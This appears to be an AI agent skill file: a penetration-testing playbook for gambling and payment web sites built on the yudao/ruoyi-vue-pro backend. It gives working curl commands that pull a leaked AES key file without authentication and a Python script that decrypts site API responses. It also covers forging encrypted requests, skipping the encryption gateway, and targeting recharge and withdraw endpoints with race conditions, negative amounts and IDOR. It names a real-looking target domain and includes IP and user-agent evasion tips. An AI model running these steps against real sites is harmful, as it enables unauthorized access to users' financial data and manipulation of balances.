---
name: 商心慈·芋府
description: "Use for yudao web /app-api encrypt + sk_encrypt key leaks."
version: 1.0.0
license: MIT
platforms: [linux, macos, windows]
metadata:
    tags: [yudao, ruoyi, gambling, app-api, encrypt, pentest, daaixianzun]
    category: daaixianzun
---

> **商心慈**
> 心慈不是心手软，账清才能走得远。
> 千门白标同一宗，认族先问商家钱。

# yudao/ruoyi-vue-pro Web 站渗透（/app-api + /app-api/encrypt 网关 + sk_encrypt.json 密钥泄露）

Use when the target is a **web** (non-TMA) gambling/game/payment site on a **yudao / ruoyi-vue-pro** Spring Boot backend: React SPA + nginx, API prefix `/app-api`, and either `/app-api/encrypt/*` returns encrypted base64 or you find `sk_encrypt.json` config files. Distinct from:
- `yudao-gambling-tma-pentest` / `yudao-tma-pentest` (same family, **Telegram Mini App** variant: per-request AES-ECB + RSA + MD5 sign `X-Ca-Token` envelope, `tenant-id` header, initData login)
- `gambling-api-crypto-reversal` (signature/WS families)
- `telegram-gambling-tma-pentest` (Qzino: `/api.html` + AES-CBC + MD5 salt `method` wrapper)

This variant's crypto envelope is **gateway-level URL rewrite + static key file** — no per-request RSA. Recognize the fingerprint FIRST, then pick the right protocol.

## 1. Fingerprint

| 信号 | 含义 |
|------|------|
| nginx + `set-cookie: server_name_session=` | 前置 nginx（非 CF 直连） |
| `<script src="/assets-<ver>/index-*.js">`（如 `assets-1.0.8.15/`） | React SPA，版本化资源目录 |
| API 前缀 `/app-api`（登录 `/app-api/v/user/*`，业务 `/app-api/api/*`） | yudao 风格 |
| **`/app-api/encrypt/*` 返回加密 base64 字符串**（非 JSON） | 加密网关前缀存在 |
| 请求需 `companycode: xgame` header（JS 硬编码 `static companyCode(){return"xgame"}`） | 租户/公司码（TMA 变体用 `tenant-id`） |
| 注册/登录用 `application/x-www-form-urlencoded`（非 JSON） | web 版习惯 |

## 2. 最高价值：sk_encrypt.json 未授权密钥泄露（先打这个）

密钥文件三路径（**root 与 `/dflt` 前缀 200 可无限读**；`/app-api` 前缀 403 nginx 拦）：

```bash
curl -sS "https://TARGET/sys-upload/data/json/sk_encrypt.json"          # 200, base64
curl -sS "https://TARGET/dflt/sys-upload/data/json/sk_encrypt.json"     # 200, base64
curl -sS "https://TARGET/app-api/sys-upload/data/json/sk_encrypt.json"  # 403 Forbidden
```

响应是 base64 → 解码得 JSON，`encrypt_key.configValue` 即 AES 密钥。实战值：`1234567890123455`（16 字节、JD 系默认弱密钥）。**未登录可无限读取** → 可解密全站 API 响应（余额/订单/钱包数据）并伪造加密请求。

```python
import base64, json
print(json.loads(base64.b64decode(open("sk.json").read().strip()))["encrypt_key"]["configValue"])
```

## 3. 加密网关机制（index-*.js 逆向要点）

- axios 请求拦截器：`getEncryptKeyBaseonRequestUrl(url)` 返回密钥时把 url 中 `/app-api`→`/app-api/encrypt`、`/im-api`→`/im-api/encrypt`（`.json` 结尾 → `_encrypt.json`）
- 三把密钥：`encryptionKey`（/app-api 用）、`dfltEncryptionKey`（`/dflt` 用）、`chatEncryptionKey`（/im-api 用）— 全部来自 sk_encrypt.json
- 响应解密 `Gr(data,key)`：`AES-CBC(key=key, iv=key, pkcs7)` → **gzip 解压** → JSON.parse
- 另见 `kaiyuancp_v2` 这类 CryptoJS passphrase 常量（`gs.encrypt(JSON.stringify(n), passphrase)`）用于特定端点
- **绕过技巧**：直接打明文前缀 `/app-api/*`（不带 /encrypt）— 服务端同样接受明文并返回明文 JSON 错误（如 `UC/INVALID_COMPANY_CODE`）；只有 `/app-api/encrypt/*` 响应才强制加密。测试优先走明文通道

解密脚本骨架：

```python
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad
import base64, zlib
KEY = b"1234567890123455"  # 从 sk_encrypt.json 获取
raw = base64.b64decode(resp.strip())
pt = unpad(AES.new(KEY, AES.MODE_CBC, iv=KEY).decrypt(raw), 16)
print(zlib.decompress(pt, 16 + zlib.MAX_WBITS).decode())
```

## 4. 认证/token 传递

- 拦截器**同时**设置 `Authorization: <token>` 和 `token: <token>` 两个 header（值 = localStorage `access_token`；`/dflt` 用 `dafacpToken`）
- 其他 header：`Language: zh-CN`、`companycode`（必填）、可选 `first_open_ip`/`root_proxy_code`/`device: pwa`
- 401 重试：`__retryCount`≤3 + 5s 间隔 + 刷新 tokenChat；无 token 调业务接口 → `UC/TOKEN_INVALID`（code+statusCode 400）

## 5. 注册/登录（v/user/reg、v/user/sign-in 实测）

```bash
curl -sS -X POST "https://TARGET/app-api/v/user/reg" \
  -H "Content-Type: application/x-www-form-urlencoded;charset=utf-8" \
  -H "companycode: xgame" -H "Language: zh-CN" \
  --data-urlencode "account=test01" --data-urlencode "password=Test@123456" \
  --data-urlencode "confirmPassword=Test@123456" --data-urlencode "mode=account" \
  --data-urlencode "version=1.0.8.15" --data-urlencode "fullName=Test User" \
  --data-urlencode "lang=zh-CN"
```

- 字段（register-*.js chunk）：`account|email` + `password` + `confirmPassword` + `mode`(QUICK/ACCOUNT/EMAIL/PHONE) + `version` + `fullName` + `lang` + 可选 `intrCode`/`vCode`/`fundPwd`/`birthday`；QUICK 模式用随机账户自动注册
- 缺 header → `UC/INVALID_COMPANY_CODE`；缺 fullName → `真实姓名不能为空`（参数名已对，逐个补字段）
- 公开配置：`GET /sys-upload/data/json/limit/userLoginLimit.json`（`vCode:1` 需人机验证、`loginType` 开关）
- **坑**：完整参数仍可能秒回（0.16s）`{"code":"system_error","msg":"网络连接超时"}` 500 —— 后端注册服务调上游（风控/代理服务）失败，注册链路被硬卡。换 IP/UA、试 QUICK 模式；报告先把密钥泄露写成确凿发现，注册阻塞如实标注，勿谎报登录成功

## 6. 测试优先级

```
1. sk_encrypt.json 密钥泄露（未授权，秒确认）
2. 明文 /app-api/* 通道探活（免加解密）
3. 注册→登录拿 token（被 system_error 卡则换 IP/QUICK 模式）
4. 登录后：money/check → recharge → withdraw → bonus/airdrop 竞态与负金额 → ebao transferIn/Out 套利 → IDOR
5. 业务逻辑漏洞（竞态/负金额/汇率操纵/未授权）→ business-logic-testing skill
```

## 7. Pitfalls

- **解密不完整排查**：`/app-api/encrypt/*` 响应 base64 长度可能**非 16 倍数**（实战 160B base64 → 120B，mod16=8）——可能带长度前缀/额外包装；先 `.strip()` 再去 base64，再看 mod-16，别急着断言算法错
- 系统 python3 常无 pip/pycryptodome → 找现成 venv（如 `/tmp/pentvenv`）跑解密脚本
- 明文 `/app-api/*` 与加密 `/app-api/encrypt/*` 双通道并存——测试用明文通道，报告说明加密网关存在 + 密钥已泄露
- 不要在两变体间混淆：TMA 变体用 X-Ca-Token/AES-ECB+RSA 信封，web 变体用 URL 前缀改写 + 静态密钥——先认指纹再选协议
- 频率限制：每接口 ≤5 次，避免打爆站点

## References

- `references/yudao-web-sk-encrypt-session.md`（⚠️本包未含此案例文件，跳过） — xgame (ldy1.xgxxx1.cc) 会话细节：完整接口清单（user/recharge/userWithdraw/airdrop/bonus/ebao/exchange）、注册参数实测、解密脚本骨架
- 关联技能：yudao TMA 变体 → `yudao-gambling-tma-pentest`（default profile）；签名/WS 家族 → `gambling-api-crypto-reversal`（default profile）
